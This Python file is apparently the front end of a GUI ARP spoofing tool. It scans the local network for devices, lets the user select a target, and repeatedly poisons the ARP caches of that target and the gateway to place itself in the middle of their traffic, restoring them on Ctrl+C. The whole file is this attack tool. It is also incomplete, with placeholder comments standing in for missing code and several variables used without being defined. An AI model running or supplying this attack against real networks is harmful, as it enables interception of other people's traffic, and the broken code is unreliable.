import tkinter as tk
from  tkinter import ttk
import ARP_spoofing
import FindGatewayIP
import time
import IPAddressList
import FindManufacturer


# Test command1
def test():
    print('Hi, the test is working!')


# ARP spoofing command
def spoofing(target_IP):
    target_ip = target_IP
    gateway_ip = FindGatewayIP.get_default_gateway_ip()
    try:
        sent_packets_count = 0
        while(True):
            ARP_spoofing.spoof(target_ip, gateway_ip)
            ARP_spoofing.spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
            time.sleep(2)  # Waits for two seconds
    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        ARP_spoofing.restore(gateway_ip, target_ip)
        ARP_spoofing.restore(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")


def get_selected_device_from_gui():
    # Create a list of items
    devices = IPAddressList.get_all_devices_on_network()

    # Function to handle listbox selection
    def on_select(event):
        global selected_device
        # Get the index of the selected item
        selected_index = listbox.curselection()[0]
        # If an item is selected, update the selected_device variable and print it
        if selected_index >= 0:
            selected_device = devices[selected_index]
            print(f"Selected device: {selected_device}")  # Print immediately

    # ... Rest of the code for get_selected_device_from_gui() remains the same ...

    # Run the main event loop (within the function)
    window.mainloop()


selected_device = None  # Declare a global variable to store the selected device


def MainWindow():
    def Test():
        ip = ip_entry.get()
        print("IP Address:", ip)
        spoofing(ip)

    def pick_device():
        global selected_device  # Access the global variable
        get_selected_device_from_gui()  # Call the function to display device list

        # Check if a device is selected (using the global variable)
        if selected_device:
            print("using pick_device()")
            print(f"IP Address: {selected_device['ip']}, MAC Address: {selected_device['mac']}")
            spoofing(selected_device['ip'])  # Start spoofing with the selected device IP
        else:
            print("No device selected")

    # ... Rest of the code for MainWindow() remains the same ...


# MAIN starts here!
if __name__ == "__main__":

    # Get the list of devices on the network
    devices = IPAddressList.get_all_devices_on_network()

    MainWindow()
